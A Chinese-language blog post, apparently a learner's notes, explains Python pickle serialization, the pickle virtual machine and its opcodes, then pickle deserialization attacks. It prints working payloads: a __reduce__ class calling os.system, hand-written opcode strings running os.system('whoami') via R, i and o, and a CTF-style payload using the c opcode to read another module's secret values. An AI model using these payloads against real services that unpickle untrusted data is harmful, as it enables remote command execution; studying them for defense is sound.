+++
title = 'python pickle 反序列化'
date = '2023-10-24T15:48:00+08:00'
categories = ['学习', '安全', 'python']
tags = ['python', '反序列化', '安全']
+++

## pickle模块

pickle模块是对Python对象结构进行二进制序列化和反序列化的协议实现，就是把Python数据变成流的形式。类似php对对象进行序列化。pickle会创建一个python语言专用的二进制格式，

### pickle模块中的两个主要函数dump()和load()。

这里贴张图：![image-20231021160729624](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310211806781.png)

也就是对对象进行序列化和反序列化的操作，和php中的serialize和unserialize类似。
举一个例子：

```python
import pickle
from Demo import test1

# class test1():
#     def __init__(self, name='haker'):
#         self.name = name

print('[+] 序列化')
print(pickle.dumps(test1()))
print('[+] 反序列化')
print(pickle.loads(pickle.dumps(test1())).name)

#[+] 序列化
#b'\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x04Demo\x94\x8c\x05test1\x94\x93\x94)\x81\x94}\x94\x8c\x04name\x94\x8c\x05haker\x94sb.'
#[+] 反序列化
#haker
```

这里可以看到序列化后的数据，这是opcode码。这里了解一下PVM(python虚拟机)的组成和执行流程。

### PVM

对python，它可以直接从源代码运行程序。python解释器先将源代码编译为字节码，然后将字节码放在PVM里面执行。

#### 由三部分组成：

- 指令处理器( Instruction processor )
  从数据流中读取操作码(opcode)和参数 , 并对其进行解释处理 . 指令处理器会循环执行这个过程 , 不断改变 stack和 memo区域的值 .直到遇到 ==.==这个结束符号 。这时 , `最终停留在栈顶的的值将会被作为反序列化对象返回 `。

- 栈区( stack )

  由 Python的列表( list)实现 , `用来临时存储数据、参数以及对象`。作为流数据处理过程中的暂存区 , 在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果

- 标签区(存储区---memo )

  由 Python的字典( dict)实现 , 可以看作是数据索引或者标记 , `为 PVM 的整个生命周期提供存储功能` .简单来说就是将反序列化完成的数据以 key-value的形式储存在memo中，以便使用。

#### 执行流程：

1.PVM会把源代码编译成字节码

字节码是Python特有的一种表现形式，不是二进制机器码，需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 .pyc 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在==内存中==生成字节码 , 在程序执行结束后被自动丢弃 .

Python进程会把编译好的字节码转发到PVM（Python虚拟机）中，PVM会循环迭代执行字节码指令，直到所有操作被完成。

### pickletools

也就是说这个opcode我们很难看懂，这里使用pickletools这个调试器
pickle构造出的字符串有6个版本，默认为3，其中0为原始的"人类可读"。

<img src="https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310211806751.png" alt="image-20231021171348234" style="zoom: 80%;" />

这里可以看一些常见的opcode的解释(以v0解释)：

| 指令 | 描述 | 具体写法 | 栈上的变化 |
| :--- | :--- | :------- | :--------- |
|      |      |          |            |

|      |                                                              |                                                    |                                                              |
| :--- | :----------------------------------------------------------- | :------------------------------------------------- | :----------------------------------------------------------- |
| c    | 获取一个全局对象或import一个模块                             | c[module]\n[instance]\n                            | 获得的对象入栈                                               |
| o    | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） | o                                                  | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 |
| i    | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） | i[module]\n[callable]\n                            | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 |
| N    | 实例化一个None                                               | N                                                  | 获得的对象入栈                                               |
| S    | 实例化一个字符串对象                                         | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                                               |
| V    | 实例化一个UNICODE字符串对象                                  | Vxxx\n                                             | 获得的对象入栈                                               |
| I    | 实例化一个int对象                                            | Ixxx\n                                             | 获得的对象入栈                                               |
| F    | 实例化一个float对象                                          | Fx.x\n                                             | 获得的对象入栈                                               |
| R    | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 | R                                                  | 函数和参数出栈，函数的返回值入栈                             |
| .    | 程序结束，栈顶的一个元素作为pickle.loads()的返回值           | .                                                  | 无                                                           |
| (    | 向栈中压入一个MARK标记                                       | (                                                  | MARK标记入栈                                                 |
| t    | 寻找栈中的上一个MARK，并组合之间的数据为元组                 | t                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |
| )    | 向栈中直接压入一个空元组                                     | )                                                  | 空元组入栈                                                   |
| l    | 寻找栈中的上一个MARK，并组合之间的数据为列表                 | l                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |
| ]    | 向栈中直接压入一个空列表                                     | ]                                                  | 空列表入栈                                                   |
| d    | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） | d                                                  | MARK标记以及被组合的数据出栈，获得的对象入栈                 |
| }    | 向栈中直接压入一个空字典                                     | }                                                  | 空字典入栈                                                   |
| p    | 将栈顶对象储存至memo_n                                       | pn\n                                               | 无                                                           |
| g    | 将memo_n的对象压栈                                           | gn\n                                               | 对象被压栈                                                   |
| 0    | 丢弃栈顶对象                                                 | 0                                                  | 栈顶对象被丢弃                                               |
| b    | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 | b                                                  | 栈上第一个元素出栈                                           |
| s    | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 | s                                                  | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 |
| u    | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                                  | MARK标记以及被组合的数据出栈，字典被更新                     |
| a    | 将栈的第一个元素append到第二个元素(列表)中                   | a                                                  | 栈顶元素出栈，第二个元素（列表）被更新                       |
| e    | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 | e                                                  | MARK标记以及被组合的数据出栈，列表被更新                     |

确实不太好理解，我们先往下看

## 漏洞分析：

### `__reduce__`方法:

最常见的反序列化，大概就是利用这个。`__reduce__()`魔术方法类似于`PHP`中的`__wakeup()`方法, 在反序列化时会先调用`__reduce__()`魔术方法。

```python
import pickle
import  pickletools
import os

class test1():
    # def __init__(self, name='haker'):
    #     self.name = name
    def __reduce__(self):
        return (os.system,('ls / ',))//返回值要么是字符串，要么是元组
a=test1()
b=pickle.dumps(a,protocol=0)

print(pickletools.dis(b))

```

![image-20231021213537129](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310212135181.png)

我们可以看到这里使用了opcode里面的R指令，他的作用：

```python
取当前栈的栈顶记为args，然后把它弹掉。
取当前栈的栈顶记为f，然后把它弹掉。
以args为参数，执行函数f，把结果压进当前栈。
```

只要R指令存在，`__reduce__()`就会执行，无论代码中是否存在这个方法。

```python
import pickle
import  pickletools
import os

class test1():
    def __init__(self, name='haker'):
        self.name = name
    # def __reduce__(self):
    #     return (os.system,('whoami',))

# opcode="b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n."
pickle.loads(b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.')#b' '表示字节字符串的开头

```

我们直接对没有`__reduce__()`的代码实例化我们构造的opcode:

![image-20231025103014326](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310251030392.png)

成功执行了命令。那么如果我们过滤了`__reduce__()`呢?我们上面也说了`__reduce__()`的执行完全取决于是否有R指令，我们把R指令ban了，这条路就行不通了。

### 全局变量包含覆盖:c指令：

*这里先解释一下c指令是干什么的，上面表格中c说: 获取一个全局对象或import一个模块,也就是说c指令可以获得全局中xxx.xxx的值。*

我们先举一个简单的例子：

```python
import pickle
import secret
#a=123
print("secret变量的值为:"+secret.a)
opcode=b'''c__main__
secret
(S'a'
S'456'
db.'''
hack=pickle.loads(opcode)
print("secret变量的值为:"+secret.a)

```

![image-20231024185224559](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310241852601.png)

分析一下opcode:
c: 往后读到换行符为模版名(`__main__`),往后读到换行符为类名(`secret`) ---（对象入栈）
(S：向栈中压入一个标记MARK(入栈)，初始化一个名为a的字符串对象(入栈)
S：实例化一个字符串对象(入栈)
db. :寻找栈中的上一个MARK(出栈)，并组合之-间的数据(出栈)为字典(a-456)(入栈),使用栈中的第一个元素(出栈)（前面的字典（a-456））对第二个元素（对象实例(`_main_.secret`)）进行属性设置(a->456 出栈),程序结束，栈顶的一个元素(也就是`_main_.secret`这个对象)作为pickle.loads()的返回值

看一下我自己画的一个图解：
![image-20231024193400358](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310241934402.png)

这个时候a的值已经被改变。

再看一个例子:

```python
import secret
import pickle
import pickletools

class flag():
    def __init__(self,a,b):
        self.a = a
        self.b = b
# new_flag = pickle.dumps(flag('A','B'),protocol=3)
# print(new_flag)
# pickletools.dis(new_flag)

your_payload = b'\x80\x03c__main__\nflag\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00aq\x03csecret\na\nq\x04X\x01\x00\x00\x00bq\x05csecret\nb\nq\x06ub.'
other_flag = pickle.loads(your_payload)
secret_flag = flag(secret.a,secret.b)

if other_flag.a == secret_flag.a and other_flag.b == secret_flag.b:
    print('flag{xxxxxx}')
else:
    print('No!')

###secret.py
a='123'
b='456'
```

这边我们不知道secret中的a和b的值。如何到达if的判断而获取flag?这里就用到了c指令，我们先输出一下正常的flag类。

![image-20231024124716394](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310241247454.png)

 X    BINUNICODE大概就是 读入字符串，并把它压入栈中，也就是类属性与值
 q     BINPUT  没什么影响，把当前栈栈顶复制一份到存储区
那么我们如果把a和b的值利用==c指令==改为secret.a和secret.b是不是就将flag类里面的属性值给改变了，而到达目的，先看一下正常序列化的结果

```python
b'\x80\x03c__main__\nflag\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00aq\x03X\x01\x00\x00\x00Aq\x04X\x01\x00\x00\x00bq\x05X\x01\x00\x00\x00Bq\x06ub.'
```

修改后:

```python
b'\x80\x03c__main__\nflag\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00aq\x03csecret\na\nq\x04X\x01\x00\x00\x00bq\x05csecret\nb\nq\x06ub.'
```

这里就是把X改为了c指令，导入secret全局对象，然后把a和b的值给修改。

### 命令执行:

前面说的`__reduce__`只能进行一次命令执行，如果要执行多次命令，就要手写opcode了。

#### R:

选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数（函数和参数出栈，函数的返回值入栈）

```python
opcode=b'''cos
system
(S'whoami'
tR.'''
```

这里第一个对象就是 os.system，第二个对象就是whoami啦.

#### i:![image-20231024201707233](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310242017276.png)

```python
opcode=b'''(S'whoami'
ios
system
.'''
```

开始==(==压入一个MARK标记，然后i指令，先获得全局函数os.system，然后找上一个MARK，并组合数据为元组，也就是whoami。

#### o:![image-20231024202855857](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202310242028894.png)

```python
opcode=b'''(cos
system
S'whoami'
o.'''
```

开始==(==压入一个MARK标记，c指令获得全局对象os.system,S：实例化一个字符串对象，o:找上一个MARK，第一个数据(os.system)为函数，后面的数据为参数(whoami)。



## 结语:

第一次接触python反序列化，其中有些部分还没完全理解，后续再接触会继续更新笔记，有错误还请各位师傅指正。
